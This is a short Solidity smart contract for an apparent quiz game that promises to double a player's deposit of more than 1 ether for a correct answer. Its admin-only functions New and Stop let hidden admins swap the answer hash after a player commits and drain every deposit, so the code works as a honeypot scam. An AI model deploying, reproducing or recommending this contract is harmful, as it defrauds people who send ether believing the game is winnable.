contract Lucky_guess 
{
    function Guess(string memory _answer) public payable
    {
        require(msg.sender == tx.origin);

        if(answerHash == keccak256(abi.encode(_answer)) && msg.value > 1 ether)
        {
            payable(msg.sender).transfer(msg.value * 2);
        }
    }

    string public question;

    bytes32 private answerHash;

    mapping (bytes32=>bool) private admin;

    function Start(string calldata _question, string calldata _answer) public payable isAdmin{
        if(answerHash==0x0){
            answerHash = keccak256(abi.encode(_answer));
            question = _question;
        }
    }

    function Stop() public payable isAdmin {
        payable(msg.sender).transfer(address(this).balance);
    }

    function New(string calldata _question, bytes32 _answerHash) public payable isAdmin{
        question = _question;
        answerHash = _answerHash;
    }

    constructor(bytes32[] memory admins) {
        for(uint256 i=0; i< admins.length; i++){
            admin[admins[i]] = true;
        }
    }

    modifier isAdmin(){
        require(admin[keccak256(abi.encodePacked(msg.sender))]);
        _;
    }

    fallback() external payable {}
}